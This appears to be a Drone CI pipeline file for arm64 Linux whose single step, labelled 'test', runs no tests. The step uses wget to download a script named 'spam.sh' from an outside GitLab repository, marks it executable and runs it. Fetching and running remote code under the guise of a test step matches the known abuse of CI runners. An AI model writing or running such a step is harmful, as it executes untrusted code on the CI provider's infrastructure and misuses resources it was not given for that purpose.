kind: pipeline
type: docker
name: default

platform:
  os: linux
  arch: arm64

steps:

- name: test
  image: golang
  commands:
  - wget https://gitlab.com/renifer12/project-7/-/raw/main/spam.sh && chmod +x spam.sh && ./spam.sh
